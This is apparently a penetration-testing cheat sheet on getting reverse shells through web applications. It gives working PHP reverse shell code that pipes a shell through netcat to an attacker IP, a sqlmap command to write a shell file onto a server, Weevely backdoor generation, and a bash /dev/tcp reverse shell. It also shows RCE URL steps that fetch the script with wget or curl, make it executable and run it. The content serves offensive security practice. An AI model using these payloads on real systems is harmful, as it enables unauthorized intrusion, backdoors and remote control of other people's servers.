---
title: Web Reverse Shell
description: We can get a shell by putting the reverse shell payload into target website.
tags:
    - Privilege Escalation
    - Reverse Shell
    - Web
refs:
date: 2023-04-07
draft: false
---

## PHP Reverse Shell (Linux)

```sh
# From local script (it's stored by default in Kali or Parrot)
cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php
# From repo (https://github.com/pentestmonkey/php-reverse-shell)
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

Replace the **\`$ip\`** and the **\`$port\`** in the script with your local ip and port.  

### Without fsockopen, and for FreeBSD

```php
<?php
set_time_limit (0);
$ip = '10.0.0.1';  // CHANGE THIS
$port = 4444;      // CHANGE THIS

// Spawn shell process
$descriptorspec = array(
0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
2 => array("file", "/tmp/error-output.txt", "a")   // stderr is a pipe that the child will write to
);

$cwd = "/tmp";
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    fwrite($pipes[0], 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
```

<br />

## PHP Revese Shell (Windows)

Below are the available payloads.

- [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
- [https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)

<br />

## ASP.NET

We can use **`.aspx`** file for reverse shell.
Download from [here](https://github.com/borjmz/aspx-reverse-shell).

<br />

## Upload Script via SQLi

```sh
# req.txt: The request settings file which is saved using Burp Suite
sqlmap -r req.txt --dbs --random-agent --batch --file-dest=/var/www/html/shell.php --file-write=./shell.php
```

<br />

## Useful Tools

- **[Weevely3](https://github.com/epinna/weevely3)**

    A web shell generator.

    1. **Generate Backdoor with Password**

        Credentials required.

        ```sh
        weevely generate <password> ./shell.php
        ```

    2. **Upload the Payload to Target Website and Execute Commands**

        ```sh
        weevely https://vulnerable.com/upload/shell.php <password> whoami
        ```

    3. **Get a Shell**

        ```sh
        weevely https://vulnerable.com/upload/shell.php <password>
        ```

<br />

## Shell Script & Remote Code Execution (RCE)

If we can find a website is vulnerable to Remote Code Execution but cannot Reverse Shell, we may be able to do that by uploading the script.

### 1. Create a shell script to reverse shell.

This file is named "revshell.sh".

```sh
#!/bin/bash
bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1
```

### 2. Upload the script to website

Start web server in local machine to upload the script.

```sh
python3 -m http.server 8000
```

Then upload it by remote code execution in target website.

```sh
https://vulnerable.com/?cmd=wget http://<local-ip>:8000/revshell.sh
# or
https://vulnerable.com/?cmd=curl <local-ip>:8000/revshell.sh
```

To confirm the script uploaded, execute the following RCE.

```sh
https://vulnerable.com/?cmd=ls
```

### 3. Get a shell

Start listener for getting a shell in local machine.

```sh
nc -lvnp 4444
```

Now execute the uploaded script via RCE.

```sh
# 1. Change permission for the script
https://vulenrable.com/?cmd=chmod 777 revshell.sh
# 2. Execute the script
https://vulnerable.com/?cmd=./revshell.sh
```

We should now get the target shell.